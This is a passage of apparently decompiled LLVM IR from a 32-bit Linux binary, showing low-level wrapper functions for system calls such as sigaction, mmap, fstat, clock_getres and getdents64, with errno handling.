  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_8053591 = load i32, i32* @edi, align 4
  store i32 %v0_8053591, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_80535a0 = load i32, i32* @eax, align 4
  %v1_80535a3 = call i32 @function_8053003(i32 %v0_80535a0)
  %v0_80535ad = load i32, i32* @ebx, align 4
  %v1_80535ad = inttoptr i32 %v0_80535ad to %sigcontext*
  %v2_80535ad = call i32 @sigreturn(%sigcontext* %v1_80535ad)
  %v0_80535b5 = load i32, i32* @ebx, align 4
  %v1_80535b5 = inttoptr i32 %v0_80535b5 to %sigcontext*
  %v2_80535b5 = call i32 @sigreturn(%sigcontext* %v1_80535b5)
  ret i32 %v2_80535b5

; uselistorder directives
  uselistorder i32 %v1_805355d, { 1, 2, 0 }
  uselistorder i32 %v1_8053539, { 1, 2, 0 }
  uselistorder i32 %v2_8053479, { 1, 0 }
  uselistorder i32 %v1_8053476, { 2, 1, 0 }
  uselistorder i32 %v1_8053455, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053452, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), i32 2), { 1, 3, 2, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), { 0, 2, 1 }
  uselistorder i32 ()* @function_805337b, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 8, 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 120, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8053556, { 1, 0 }
  uselistorder label %dec_label_pc_8053532, { 1, 0 }
  uselistorder label %dec_label_pc_805350d, { 1, 0 }
  uselistorder label %dec_label_pc_8053476, { 1, 0 }
  uselistorder label %dec_label_pc_805345e, { 1, 0 }
}

define i32 @function_80535b7(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80535b7:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_80535b7 = load i32, i32* @esi, align 4
  %v0_80535b8 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80535cd = icmp eq i32* %arg2, null
  br i1 %v1_80535cd, label %dec_label_pc_80535b7.dec_label_pc_8053620_crit_edge, label %dec_label_pc_80535d1

dec_label_pc_80535b7.dec_label_pc_8053620_crit_edge: ; preds = %dec_label_pc_80535b7
  br label %dec_label_pc_8053620

dec_label_pc_80535d1:                             ; preds = %dec_label_pc_80535b7
  %v2_80535d1 = load i32, i32* %arg2, align 4
  store i32 %v2_80535d1, i32* %stack_var_-148, align 4
  %v1_80535da = add i32 %tmp11, 4
  %v3_80535ec = bitcast i32* %stack_var_-136 to i16*
  %v4_80535ec = call i32 @function_8053c3a(i16* %v3_80535ec, i32 %v1_80535da, i32 128)
  br label %dec_label_pc_8053620

dec_label_pc_8053620:                             ; preds = %dec_label_pc_80535b7.dec_label_pc_8053620_crit_edge, %dec_label_pc_80535d1
  %v1_8053622 = icmp eq i32 %arg3, 0
  %v2_8053626 = ptrtoint i32* %stack_var_-288 to i32
  %.v2_8053626 = select i1 %v1_8053622, i32 0, i32 %v2_8053626
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  %v0_805363a = select i1 %v1_80535cd, %sigaction* null, %sigaction* %phitmp
  %v5_8053642 = call i32 @function_80536dd(i32 %arg1, %sigaction* %v0_805363a, i32 %.v2_8053626, i32 8)
  store i32 %v5_8053642, i32* %ebx.global-to-local, align 4
  %v2_8053650 = icmp slt i32 %v5_8053642, 0
  %or.cond = or i1 %v1_8053622, %v2_8053650
  br i1 %or.cond, label %dec_label_pc_8053685, label %dec_label_pc_8053654

dec_label_pc_8053654:                             ; preds = %dec_label_pc_8053620
  %v3_8053654 = load i32, i32* %stack_var_-288, align 4
  %v2_8053658 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8053654, i32* %v2_8053658, align 4
  %v2_8053660 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8053665 = add i32 %arg3, 4
  %v3_8053669 = inttoptr i32 %v1_8053665 to i16*
  %v4_8053669 = call i32 @function_8053c3a(i16* %v3_8053669, i32 %v2_8053660, i32 128)
  %v2_8053672 = add i32 %arg3, 132
  %v3_8053672 = inttoptr i32 %v2_8053672 to i32*
  %v2_805367f = add i32 %arg3, 136
  %v3_805367f = inttoptr i32 %v2_805367f to i32*
  %v0_8053685.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053685

dec_label_pc_8053685:                             ; preds = %dec_label_pc_8053620, %dec_label_pc_8053654
  %v0_8053685 = phi i32 [ %v5_8053642, %dec_label_pc_8053620 ], [ %v0_8053685.pre, %dec_label_pc_8053654 ]
  store i32 %v0_80535b8, i32* @ebx, align 4
  store i32 %v0_80535b7, i32* @esi, align 4
  ret i32 %v0_8053685

; uselistorder directives
  uselistorder i32 136, { 1, 0 }
  uselistorder i32 132, { 2, 0, 1 }
  uselistorder i32 128, { 0, 1, 3, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053685, { 1, 0 }
  uselistorder label %dec_label_pc_8053620, { 1, 0 }
}

define i32 @function_8053690(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8053690:
  %stack_var_4 = alloca i32, align 4
  %v0_8053690 = load i32, i32* @ebx, align 4
  store i32 %v0_8053690, i32* @edx, align 4
  %v2_805369b = load i32, i32* @ecx, align 4
  %v4_805369b = load i32, i32* @esi, align 4
  %v5_805369b = load i32, i32* @edi, align 4
  %v6_805369b = load i32, i32* @ebp, align 4
  %v7_805369b = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_805369b, i32 %v0_8053690, i32 %v4_805369b, i32 %v5_805369b, i32 %v6_805369b)
  %v8_805369b = ptrtoint i32* %v7_805369b to i32
  store i32 %v0_8053690, i32* @ebx, align 4
  %v3_80536a4 = icmp ugt i32* %v7_805369b, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_80536a4, i32 134561109)
  ret i32 %v8_805369b

; uselistorder directives
  uselistorder i32* @ebp, { 2, 48, 49, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 20, 21, 22, 23, 1, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 47, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* @ecx, { 2, 33, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 1, 26, 32, 31, 28, 29, 27, 30, 34 }
}

define i32 @function_80536ab(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80536ab:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80536ab = load i32, i32* @ebx, align 4
  store i32 %v0_80536ab, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80536be = call i32 @int80_syscall(i32 102)
  store i32 %v1_80536be, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80536be, -4095
  br i1 %tmp9, label %dec_label_pc_80536d7, label %dec_label_pc_80536cb

dec_label_pc_80536cb:                             ; preds = %dec_label_pc_80536ab
  %v1_80536cb = call i32 @function_8051a1b(i32 %v0_80536ab)
  %v0_80536d0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80536d0 = sub i32 0, %v0_80536d0
  %v2_80536d2 = inttoptr i32 %v1_80536cb to i32*
  store i32 %v1_80536d0, i32* %v2_80536d2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80536db.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80536d7

dec_label_pc_80536d7:                             ; preds = %dec_label_pc_80536ab, %dec_label_pc_80536cb
  %v2_80536db = phi i32 [ %v0_80536ab, %dec_label_pc_80536ab ], [ %v2_80536db.pre, %dec_label_pc_80536cb ]
  %v0_80536d7 = phi i32 [ %v1_80536be, %dec_label_pc_80536ab ], [ -1, %dec_label_pc_80536cb ]
  %v2_80536d9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80536d9, i32* @edx, align 4
  store i32 %v2_80536db, i32* @ebx, align 4
  ret i32 %v0_80536d7

; uselistorder directives
  uselistorder i32 %v1_80536be, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80536d7, { 1, 0 }
}

define i32 @function_80536dd(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80536dd:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_80536de = load i32, i32* @esi, align 4
  store i32 %v0_80536de, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80536f2 = load i32, i32* @ebx, align 4
  %v7_80536fa = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_80536fa, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_80536fa, -4095
  br i1 %tmp14, label %dec_label_pc_8053712, label %dec_label_pc_8053706

dec_label_pc_8053706:                             ; preds = %dec_label_pc_80536dd
  %v1_8053706 = call i32 @function_8051a1b(i32 %v0_80536f2)
  %v0_805370b = load i32, i32* %esi.global-to-local, align 4
  %v1_805370b = sub i32 0, %v0_805370b
  %v2_805370d = inttoptr i32 %v1_8053706 to i32*
  store i32 %v1_805370b, i32* %v2_805370d, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8053715.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053712

dec_label_pc_8053712:                             ; preds = %dec_label_pc_80536dd, %dec_label_pc_8053706
  %v2_8053715 = phi i32 [ %v0_80536de, %dec_label_pc_80536dd ], [ %v2_8053715.pre, %dec_label_pc_8053706 ]
  %v0_8053712 = phi i32 [ %v7_80536fa, %dec_label_pc_80536dd ], [ -1, %dec_label_pc_8053706 ]
  store i32 %v2_8053715, i32* @esi, align 4
  ret i32 %v0_8053712

; uselistorder directives
  uselistorder i32 %v7_80536fa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053712, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8053718(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8053718:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8053740(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053740:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053740 = load i32, i32* @ebx, align 4
  store i32 %v0_8053740, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8053753 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8053753, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8053753, -4095
  br i1 %tmp10, label %dec_label_pc_805376c, label %dec_label_pc_8053760

dec_label_pc_8053760:                             ; preds = %dec_label_pc_8053740
  %v1_8053760 = call i32 @function_8051a1b(i32 %v0_8053740)
  %v0_8053765 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053765 = sub i32 0, %v0_8053765
  %v2_8053767 = inttoptr i32 %v1_8053760 to i32*
  store i32 %v1_8053765, i32* %v2_8053767, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053770.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805376c

dec_label_pc_805376c:                             ; preds = %dec_label_pc_8053740, %dec_label_pc_8053760
  %v2_8053770 = phi i32 [ %v0_8053740, %dec_label_pc_8053740 ], [ %v2_8053770.pre, %dec_label_pc_8053760 ]
  %v0_805376c = phi i32 [ %v4_8053753, %dec_label_pc_8053740 ], [ -1, %dec_label_pc_8053760 ]
  %v2_805376e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805376e, i32* @edx, align 4
  store i32 %v2_8053770, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805376c

; uselistorder directives
  uselistorder i32 %v4_8053753, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805376c, { 1, 0 }
}

define i32 @function_8053772(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053772:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053772 = load i32, i32* @ebx, align 4
  store i32 %v0_8053772, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8053785 = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8053785, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8053785, -4095
  br i1 %tmp13, label %dec_label_pc_80537a0, label %dec_label_pc_8053792

dec_label_pc_8053792:                             ; preds = %dec_label_pc_8053772
  %v1_8053792 = call i32 @function_8051a1b(i32 %v0_8053772)
  %v0_8053797 = load i32, i32* @ebx, align 4
  %v1_8053797 = sub i32 0, %v0_8053797
  %v2_8053799 = inttoptr i32 %v1_8053792 to i32*
  store i32 %v1_8053797, i32* %v2_8053799, align 4
  %v2_80537b8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80537b3

dec_label_pc_80537a0:                             ; preds = %dec_label_pc_8053772
  %v1_80537a0 = icmp eq i32 %v4_8053785, 0
  %v1_80537a2 = icmp eq i1 %v1_80537a0, false
  br i1 %v1_80537a2, label %dec_label_pc_80537b3, label %dec_label_pc_80537a4

dec_label_pc_80537a4:                             ; preds = %dec_label_pc_80537a0
  %v4_80537ab = bitcast i32* %stack_var_-68 to i16*
  %v5_80537ab = call i32 @function_8053bbd(i16* %v4_80537ab, i32 %arg2, i32 %v4_8053785, i32 %v4_8053785)
  %v0_80537b3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80537b3

dec_label_pc_80537b3:                             ; preds = %dec_label_pc_80537a0, %dec_label_pc_8053792, %dec_label_pc_80537a4
  %v2_80537b8 = phi i32 [ %v0_8053772, %dec_label_pc_80537a0 ], [ %v2_80537b8.pre, %dec_label_pc_8053792 ], [ %v0_8053772, %dec_label_pc_80537a4 ]
  %v0_80537b3 = phi i32 [ %v4_8053785, %dec_label_pc_80537a0 ], [ -1, %dec_label_pc_8053792 ], [ %v0_80537b3.pre, %dec_label_pc_80537a4 ]
  store i32 %v2_80537b8, i32* @ebx, align 4
  ret i32 %v0_80537b3

; uselistorder directives
  uselistorder i32 %v4_8053785, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_80537b3, { 2, 0, 1 }
}

define i32 @function_80537ba(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80537ba:
  %eax.global-to-local = alloca i32, align 4
  %v0_80537ba = load i32, i32* @edi, align 4
  %v0_80537bb = load i32, i32* @esi, align 4
  %v0_80537bc = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_80537c1 = load i32, i32* @edx, align 4
  %v7_80537cb = inttoptr i32 %arg2 to i32*
  %v8_80537cb = call i32 @function_8053829(i32 %arg1, i32* %v7_80537cb, i32 %arg3, i32 %v0_80537c1, i32 %v0_80537bc, i32 %v0_80537bb, i32 %v0_80537ba)
  store i32 %v8_80537cb, i32* %eax.global-to-local, align 4
  store i32 %v8_80537cb, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_80537cb, 1
  br i1 %tmp24, label %dec_label_pc_8053823, label %dec_label_pc_80537d9

dec_label_pc_80537d9:                             ; preds = %dec_label_pc_80537ba
  %v0_80537d9 = load i32, i32* @ebx, align 4
  %v2_80537d9 = add i32 %v0_80537d9, %v8_80537cb
  store i32 %v2_80537d9, i32* @edi, align 4
  %v7_805381f4 = icmp ult i32 %v0_80537d9, %v2_80537d9
  br i1 %v7_805381f4, label %dec_label_pc_80537de, label %dec_label_pc_8053823

dec_label_pc_80537de:                             ; preds = %dec_label_pc_80537d9, %dec_label_pc_80537de
  %v0_80537de = phi i32 [ %v2_805381d, %dec_label_pc_80537de ], [ %v0_80537d9, %dec_label_pc_80537d9 ]
  %v1_80537de = add i32 %v0_80537de, 8
  %v2_80537de = inttoptr i32 %v1_80537de to i32*
  %v3_80537de = load i32, i32* %v2_80537de, align 4
  store i32 %v3_80537de, i32* %eax.global-to-local, align 4
  %v2_80537e1 = add i32 %v0_80537de, 4
  %v3_80537e1 = inttoptr i32 %v2_80537e1 to i32*
  store i32 %v3_80537de, i32* %v3_80537e1, align 4
  %v0_80537e4 = load i32, i32* @ebx, align 4
  %v1_80537e4 = add i32 %v0_80537e4, 16
  %v2_80537e4 = inttoptr i32 %v1_80537e4 to i32*
  %v3_80537e4 = load i32, i32* %v2_80537e4, align 4
  store i32 %v3_80537e4, i32* %eax.global-to-local, align 4
  %v1_80537e7 = trunc i32 %v3_80537e4 to i16
  %v3_80537e7 = add i32 %v0_80537e4, 8
  %v4_80537e7 = inttoptr i32 %v3_80537e7 to i16*
  store i16 %v1_80537e7, i16* %v4_80537e7, align 2
  %v0_80537eb = load i32, i32* @ebx, align 4
  %v1_80537eb = add i32 %v0_80537eb, 18
  %v2_80537eb = inttoptr i32 %v1_80537eb to i8*
  %v3_80537eb = load i8, i8* %v2_80537eb, align 1
  %v4_80537eb = zext i8 %v3_80537eb to i32
  %v5_80537eb = load i32, i32* %eax.global-to-local, align 4
  %v6_80537eb = and i32 %v5_80537eb, -256
  %v7_80537eb = or i32 %v6_80537eb, %v4_80537eb
  store i32 %v7_80537eb, i32* %eax.global-to-local, align 4
  %v3_80537ee = add i32 %v0_80537eb, 10
  %v4_80537ee = inttoptr i32 %v3_80537ee to i8*
  store i8 %v3_80537eb, i8* %v4_80537ee, align 1
  %v0_80537f2 = load i32, i32* @ebx, align 4
  %v1_80537f2 = add i32 %v0_80537f2, 8
  %v2_80537f2 = inttoptr i32 %v1_80537f2 to i16*
  %v3_80537f2 = load i16, i16* %v2_80537f2, align 2
  %v4_80537f2 = zext i16 %v3_80537f2 to i32
  %v1_80537f6 = add nsw i32 %v4_80537f2, -19
  %v1_80537fa = add i32 %v0_80537f2, 19
  %v1_80537fe = add i32 %v0_80537f2, 11
  store i32 %v1_80537fe, i32* %eax.global-to-local, align 4
  %v3_8053802 = inttoptr i32 %v1_80537fe to i8*
  %v4_8053802 = call i32 @function_8051a45(i8* %v3_8053802, i32 %v1_80537fa, i32 %v1_80537f6)
  store i32 %v4_8053802, i32* %eax.global-to-local, align 4
  %v0_805380a = load i32, i32* @ebx, align 4
  %v1_805380a = add i32 %v0_805380a, 8
  %v2_805380a = inttoptr i32 %v1_805380a to i16*
  %v3_805380a = load i16, i16* %v2_805380a, align 2
  %v4_805380a = zext i16 %v3_805380a to i32
  store i32 %v4_805380a, i32* %eax.global-to-local, align 4
  %v3_8053811 = inttoptr i32 %v0_805380a to i8*
  %v4_8053811 = call i32 @function_8051a45(i8* %v3_8053811, i32 %v0_805380a, i32 %v4_805380a)
  store i32 %v4_8053811, i32* %eax.global-to-local, align 4
  %v0_8053816 = load i32, i32* @ebx, align 4
  %v1_8053816 = add i32 %v0_8053816, 8
  %v2_8053816 = inttoptr i32 %v1_8053816 to i16*
  %v3_8053816 = load i16, i16* %v2_8053816, align 2
  %v4_8053816 = zext i16 %v3_8053816 to i32
  store i32 %v4_8053816, i32* %eax.global-to-local, align 4
  %v2_805381d = add i32 %v4_8053816, %v0_8053816
  store i32 %v2_805381d, i32* @ebx, align 4
  %v1_805381f = load i32, i32* @edi, align 4
  %v7_805381f = icmp ult i32 %v2_805381d, %v1_805381f
  br i1 %v7_805381f, label %dec_label_pc_80537de, label %dec_label_pc_805381f.dec_label_pc_8053823.loopexit_crit_edge

dec_label_pc_805381f.dec_label_pc_8053823.loopexit_crit_edge: ; preds = %dec_label_pc_80537de
  %v0_8053823.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053823

dec_label_pc_8053823:                             ; preds = %dec_label_pc_80537d9, %dec_label_pc_805381f.dec_label_pc_8053823.loopexit_crit_edge, %dec_label_pc_80537ba
  %v0_8053823 = phi i32 [ %v8_80537cb, %dec_label_pc_80537ba ], [ %v0_8053823.pre.pre, %dec_label_pc_805381f.dec_label_pc_8053823.loopexit_crit_edge ], [ %v8_80537cb, %dec_label_pc_80537d9 ]
  store i32 %v0_8053823, i32* %eax.global-to-local, align 4
  store i32 %v0_80537bb, i32* @esi, align 4
  store i32 %v0_80537ba, i32* @edi, align 4
  ret i32 %v0_8053823

; uselistorder directives
  uselistorder i32 %v0_8053823, { 1, 0 }
  uselistorder i32 %v2_805381d, { 1, 2, 0 }
  uselistorder i32 %v0_805380a, { 1, 0, 2 }
  uselistorder i32 %v0_80537f2, { 1, 0, 2 }
  uselistorder i32 %v0_80537de, { 1, 0 }
  uselistorder i32 %v0_80537d9, { 0, 2, 1 }
  uselistorder i32 %v8_80537cb, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 11, { 4, 3, 5, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_8053823, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80537de, { 1, 0 }
}

define i32 @function_8053829(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8053829:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_805382c = load i32, i32* @edi, align 4
  %v0_805382e = load i32, i32* @ebx, align 4
  %v15_805382f = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8053838 = add i32 %arg3, 30
  %v1_805383e = and i32 %v1_8053838, -16
  %v2_8053841 = sub i32 %v15_805382f, %v1_805383e
  %v1_8053843 = add i32 %v2_8053841, 15
  %v1_8053847 = and i32 %v1_8053843, -16
  %v1_805384d = inttoptr i32 %v1_8053847 to %linux_dirent64*
  store i32 %v1_8053847, i32* %ecx.global-to-local, align 4
  %v2_805384f = add i32 %v2_8053841, -4
  %v3_805384f = inttoptr i32 %v2_805384f to i32*
  store i32 %v0_805382e, i32* %v3_805384f, align 4
  %v0_8053850 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8053857 = call i32 @getdents64(i32 %v0_8053850, %linux_dirent64* %v1_805384d, i32 %arg3)
  store i32 %v5_8053857, i32* %eax.global-to-local, align 4
  %v0_8053859 = load i32, i32* @esp, align 4
  %v3_8053859 = add i32 %v0_8053859, 4
  %tmp39 = icmp ult i32 %v5_8053857, -4095
  br i1 %tmp39, label %dec_label_pc_8053879, label %dec_label_pc_8053864

dec_label_pc_8053864:                             ; preds = %dec_label_pc_8053829
  %v1_8053864 = call i32 @function_8051a1b(i32 %v5_8053857)
  store i32 %v1_8053864, i32* %eax.global-to-local, align 4
  %v4_8053869 = sub i32 0, %v5_8053857
  %v2_805386f = inttoptr i32 %v1_8053864 to i32*
  store i32 %v4_8053869, i32* %v2_805386f, align 4
  br label %dec_label_pc_8053935

dec_label_pc_8053879:                             ; preds = %dec_label_pc_8053829
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8053847, i32* @ebx, align 4
  %v5_8053925 = add i32 %v5_8053857, %v1_8053847
  store i32 %v5_8053925, i32* %eax.global-to-local, align 4
  %v7_805392829 = icmp ult i32 %v1_8053847, %v5_8053925
  br i1 %v7_805392829, label %dec_label_pc_8053892.lr.ph, label %dec_label_pc_8053930

dec_label_pc_8053892.lr.ph:                       ; preds = %dec_label_pc_8053879
  %v5_805389f = add i32 %tmp14, %arg3
  br label %dec_label_pc_8053892

dec_label_pc_8053892:                             ; preds = %dec_label_pc_8053892.lr.ph, %dec_label_pc_80538d4
  %stack_var_-32.034 = phi i32 [ -1, %dec_label_pc_8053892.lr.ph ], [ %v3_80538d7, %dec_label_pc_80538d4 ]
  %stack_var_-36.033 = phi i32 [ -1, %dec_label_pc_8053892.lr.ph ], [ %v3_80538d4, %dec_label_pc_80538d4 ]
  %v0_80538e032 = phi i32 [ %v1_8053847, %dec_label_pc_8053892.lr.ph ], [ %v2_805391d, %dec_label_pc_80538d4 ]
  %v1_80538e531 = phi i32 [ %tmp14, %dec_label_pc_8053892.lr.ph ], [ %v2_80538a2, %dec_label_pc_80538d4 ]
  %v0_80538ac30 = phi i32 [ %v3_8053859, %dec_label_pc_8053892.lr.ph ], [ %v1_805391f, %dec_label_pc_80538d4 ]
  %v1_8053892 = add i32 %v0_80538e032, 16
  %v2_8053892 = inttoptr i32 %v1_8053892 to i16*
  %v3_8053892 = load i16, i16* %v2_8053892, align 2
  %v4_8053892 = zext i16 %v3_8053892 to i32
  %v1_8053896 = add nuw nsw i32 %v4_8053892, 3
  %v1_805389c = and i32 %v1_8053896, 131068
  store i32 %v1_805389c, i32* %ecx.global-to-local, align 4
  store i32 %v5_805389f, i32* %eax.global-to-local, align 4
  %v2_80538a2 = add i32 %v1_805389c, %v1_80538e531
  %tmp40 = icmp ugt i32 %v2_80538a2, %v5_805389f
  br i1 %tmp40, label %dec_label_pc_80538ac, label %dec_label_pc_80538d4

dec_label_pc_80538ac:                             ; preds = %dec_label_pc_8053892
  %v1_80538ac = add i32 %v0_80538ac30, -4
  %v2_80538ac = inttoptr i32 %v1_80538ac to i32*
  store i32 0, i32* %v2_80538ac, align 4
  %v5_80538ae = add i32 %v0_80538ac30, -8
  %v6_80538ae = inttoptr i32 %v5_80538ae to i32*
  store i32 %stack_var_-32.034, i32* %v6_80538ae, align 4
  %v5_80538b1 = add i32 %v0_80538ac30, -12
  %v6_80538b1 = inttoptr i32 %v5_80538b1 to i32*
  store i32 %stack_var_-36.033, i32* %v6_80538b1, align 4
  %v5_80538b4 = add i32 %v0_80538ac30, -16
  %v6_80538b4 = inttoptr i32 %v5_80538b4 to i32*
  store i32 %arg1, i32* %v6_80538b4, align 4
  %v1_80538b7 = call i32 @function_8053a3f(i32 %v2_80538a2)
  store i32 %v1_80538b7, i32* %eax.global-to-local, align 4
  %v0_80538bf = load i32, i32* @esi, align 4
  %v15_80538bf = icmp eq i32 %v0_80538bf, %tmp14
  %v1_80538c2 = icmp eq i1 %v15_80538bf, false
  br i1 %v1_80538c2, label %dec_label_pc_8053930, label %dec_label_pc_80538c4

dec_label_pc_80538c4:                             ; preds = %dec_label_pc_80538ac
  %v1_80538c4 = call i32 @function_8051a1b(i32 %v2_80538a2)
  store i32 %v1_80538c4, i32* %eax.global-to-local, align 4
  %v1_80538c9 = inttoptr i32 %v1_80538c4 to i32*
  store i32 22, i32* %v1_80538c9, align 4
  br label %dec_label_pc_8053935

dec_label_pc_80538d4:                             ; preds = %dec_label_pc_8053892
  %v1_80538d4 = add i32 %v0_80538e032, 8
  %v2_80538d4 = inttoptr i32 %v1_80538d4 to i32*
  %v3_80538d4 = load i32, i32* %v2_80538d4, align 4
  store i32 %v3_80538d4, i32* %eax.global-to-local, align 4
  %v1_80538d7 = add i32 %v0_80538e032, 12
  %v2_80538d7 = inttoptr i32 %v1_80538d7 to i32*
  %v3_80538d7 = load i32, i32* %v2_80538d7, align 4
  %v1_80538e0 = inttoptr i32 %v0_80538e032 to i32*
  %v2_80538e0 = load i32, i32* %v1_80538e0, align 4
  store i32 %v2_80538e0, i32* %eax.global-to-local, align 4
  %v1_80538e2 = add i32 %v0_80538e032, 4
  %v2_80538e2 = inttoptr i32 %v1_80538e2 to i32*
  %v3_80538e2 = load i32, i32* %v2_80538e2, align 4
  %v2_80538e5 = add i32 %v1_80538e531, 4
  %v3_80538e5 = inttoptr i32 %v2_80538e5 to i32*
  store i32 %v3_80538e2, i32* %v3_80538e5, align 4
  %v0_80538e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538e8 = load i32, i32* @esi, align 4
  %v2_80538e8 = inttoptr i32 %v1_80538e8 to i32*
  store i32 %v0_80538e8, i32* %v2_80538e8, align 4
  %v0_80538ea = load i32, i32* @ebx, align 4
  %v1_80538ea = add i32 %v0_80538ea, 8
  %v2_80538ea = inttoptr i32 %v1_80538ea to i32*
  %v3_80538ea = load i32, i32* %v2_80538ea, align 4
  store i32 %v3_80538ea, i32* %eax.global-to-local, align 4
  %v1_80538ed = add i32 %v0_80538ea, 12
  %v2_80538ed = inttoptr i32 %v1_80538ed to i32*
  %v3_80538ed = load i32, i32* %v2_80538ed, align 4
  %v1_80538f0 = load i32, i32* @esi, align 4
  %v2_80538f0 = add i32 %v1_80538f0, 12
